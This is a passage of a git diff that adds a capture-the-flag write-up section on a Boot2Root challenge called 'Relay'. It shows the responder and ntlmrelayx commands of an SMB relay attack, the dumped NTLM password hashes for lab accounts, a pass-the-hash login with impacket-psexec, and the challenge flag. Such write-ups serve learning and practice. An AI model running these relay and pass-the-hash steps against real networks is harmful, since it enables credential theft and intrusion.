@@ -690,7 +690,46 @@ That's why the shellcode could not execute
 
 So ideally to me this isn't possible to solve since the shellcode won't execute so I layed a complain to the admin multiple times but they kept on telling me that since it had a solve already then it's right and they seemed to have a working solution screenshot which I'm thinking isn't the same as the binary being uploaded to the challenge dashboard but it had a solve still, so if anyone knows a way to solve this "PLS DM ME ON DISCORD"
 
+### Boot2Root
 
+#### Relay [First Blood 🩸]
+
+The challenge description gave two ip addresses and was saying something related to checking every 3 minutes
+
+On scanning the first host showed it wasn't up idk why but the second host gave this result
+![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/54a49384-0339-41f3-b73b-9cdbaa8ae9db)
+
+On checking smb showed that we don't have anonymous access to list shares 
+
+From the challenge name I just guessed it's going to be SMB Relay attack
+
+But before I proceeded I checked if it allowed SMB Signing which would allow SMB Relay and yes it was enabled
+
+So I just turned off SMB in my responder configuration file then ran this command
+
+```
+sudo responder -I wlan0 -v
+```
+
+My network interface was on `wlan0` so to then perform the smb relay I ran this command
+
+```
+sudo ntlmrelayx.py -t 192.168.31.209 -smb2support
+```
+
+It took more than 3 minutes but after like 5 or so I got some hashes on responder end
+
+```
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:10eca58175d4228ece151e287086e824:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+Isid0r3:1000:aad3b435b51404eeaad3b435b51404ee:7206e0a2cf25283655641be7e2954bf4:::
+```
+
+I didn't even attempt to crack the hash so I just did PassTheHash (PTH) via `impacket-psexec` then on trying for the users it worked for `Isid0r3` and the flag was in a file `Administration.txt` in the user's desktop directory
+
+```
+Flag: EcoWasCTF{Gg_You_Got_me_Yeah_789456123}
+```
 
 
 This CTF was an interesting one and I meet tons of cool people there 
